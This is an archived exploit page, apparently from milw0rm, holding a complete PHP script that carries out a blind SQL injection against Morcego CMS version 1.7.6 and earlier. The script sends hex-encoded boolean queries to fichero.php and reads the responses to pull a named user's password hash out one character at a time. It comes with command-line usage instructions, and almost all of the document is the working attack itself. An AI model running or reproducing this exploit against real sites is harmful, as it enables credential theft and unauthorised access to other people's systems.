<html><head><title>Morcego CMS <= 1.7.6 Remote Blind SQL Injection Exploit</title></head><pre>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-           __           __     _       __                -
+      ____/ /___ ______/ /__  (_)___  / /_____  _____    +
-     / __  / __ `/ ___/ //_/ / / __ \/ //_/ _ \/ ___/    -
+    / /_/ / /_/ / /  / ,&lt;   / / /_/ / ,&lt; /  __/ /        +
-    \__,_/\__,_/_/  /_/|_|_/ /\____/_/|_|\___/_/         -
+                        /___/                            +
-                                                         -
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

&lt;?php

function usage () {
	exit (  &quot;\n&quot;.
		&quot;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n&quot;.
		&quot;-                                                                   -\n&quot;.
		&quot;+ Morcego CMS &lt;= 1.7.6 Blind SQL Injection Exploit                  +\n&quot;.
		&quot;- Author  : darkjoker                                               -\n&quot;.
		&quot;+ Site    : http://darkjoker.net23.net                              +\n&quot;.
	        &quot;- Download: http://sourceforge.net/projects/morcegocms/             -\n&quot;.
		&quot;+ Usage   : php xpl.php &lt;hostname&gt; &lt;path&gt; &lt;username&gt;                +\n&quot;.
		&quot;- Ex.     : php xpl.php localhost /MorcegoCMS/ root                 -\n&quot;.
		&quot;+                                                                   +\n&quot;.
		&quot;-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-\n&quot;.
		&quot;\n&quot;);
}

function hex ($string) {
	$i=0;
	while ($i&lt;strlen($string)) 
		$hex .= &quot;%&quot;.dechex(ord($string[$i++]));
	return $hex;
}

function check_chr ($hostname, $path, $pos, $char, $username) {
	$char = ord ($char);
	if (!($sp = fsockopen ($hostname, 80, $errno, $errstr, 5)))
		die (&quot;[-] Unknow hostname.&quot;);
	$query = hex (&quot;1' OR ASCII(SUBSTRING((SELECT password FROM morcego_users WHERE username='{$username}'),{$pos},1))={$char}-- &quot;);
	$request = &quot;GET {$path}fichero.php?{$query} HTTP/1.1\r\n&quot;.
		   &quot;Host: {$hostname}\r\n&quot;.
		   &quot;Connection: Close\r\n\r\n&quot;;
	fputs ($sp, $request);
	while (!feof ($sp))
		$reply .= fgets ($sp, 1024);
	fclose ($sp);
	if (preg_match (&quot;|Page not found|&quot;, $reply))
		return false;
	else
		return true;
}

if ($argc != 4)
	usage ();
$hostname = $argv [1];
$path = $argv [2];
$username = $argv [3];
$array = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;
echo &quot;[+] Password (hash): &quot;;
for ($i=0,$d=1;$i&lt;strlen($array);) {
	if (check_chr ($hostname, $path, $d, $array [$i], $username)) {
		echo $array [$i];
		$i=0;
		$d++;
	}
	else
		$i++;
}
echo &quot;\n&quot;;

# milw0rm.com [2009-07-10]</pre></html>